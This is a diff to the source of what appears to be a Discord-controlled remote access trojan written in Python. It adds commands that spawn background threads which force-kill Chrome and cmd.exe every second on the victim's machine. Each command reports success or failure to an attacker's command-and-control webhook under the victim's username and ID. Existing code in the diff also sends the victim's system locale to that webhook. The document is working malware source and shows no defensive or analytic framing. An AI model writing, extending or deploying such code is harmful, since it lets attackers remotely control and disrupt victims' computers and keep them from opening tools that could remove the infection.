@@ -1620,7 +1620,7 @@ async def remove(ctx):
         try:
             lan = locale.getdefaultlocale()
             webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
-            embed = DiscordEmbed(title=f"**Successfull got sys lan from : {usr} #{ID}**", description=f"{lan}", color='09e30d')
+            embed = DiscordEmbed(title=f"**Successfull got sys lan from: {usr} #{ID}**", description=f"{lan}", color='09e30d')
             webhook.add_embed(embed)
             response = webhook.execute()
         except Exception as e:
@@ -1629,5 +1629,58 @@ async def remove(ctx):
             webhook.add_embed(embed) 
             response = webhook.execute()
 
-bot.run(BOT_TOKEN) #run bot
+@bot.command(name="terchrome", pass_ctx=True)
+async def remove(ctx):
+    command = ctx.message.content.replace("!terchrome", "")
+    check_id = command.split()
+    if int(check_id[0]) == int(ID):
+        try:
+            def killchrome():
+                import os
+                import time
+                while True:
+                    os.system("Taskkill /f /IM chrome.exe")
+                    time.sleep(1)
 
+            kchrome = threading.Thread(target=killchrome)
+            kchrome._running = True
+            kchrome.daemon = True
+            kchrome.start()
+            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
+            embed = DiscordEmbed(title=f"**Successfull started to terminate new chrome windows: {usr} #{ID}**", description=None, color='09e30d')
+            webhook.add_embed(embed)
+            response = webhook.execute()
+        except Exception as e:
+            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
+            embed = DiscordEmbed(title=f"**Failed to terminate new chrome windows: {usr} #{ID}**", description=f"{e}", color='ff0000')
+            webhook.add_embed(embed) 
+            response = webhook.execute()
+    
+@bot.command(name="tercmd", pass_ctx=True)
+async def remove(ctx):
+    command = ctx.message.content.replace("!tercmd", "")
+    check_id = command.split()
+    if int(check_id[0]) == int(ID):
+        try:
+            def killcmd():
+                import os
+                import time
+                while True:
+                    os.system("Taskkill /f /IM cmd.exe")
+                    time.sleep(1)
+
+            kchrome = threading.Thread(target=killcmd)
+            kchrome._running = True
+            kchrome.daemon = True
+            kchrome.start()
+            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
+            embed = DiscordEmbed(title=f"**Successfull started to terminate new cmd windows: {usr} #{ID}**", description=None, color='09e30d')
+            webhook.add_embed(embed)
+            response = webhook.execute()
+        except Exception as e:
+            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
+            embed = DiscordEmbed(title=f"**Failed to terminate new cmd windows: {usr} #{ID}**", description=f"{e}", color='ff0000')
+            webhook.add_embed(embed) 
+            response = webhook.execute()
+
+bot.run(BOT_TOKEN) #run bot
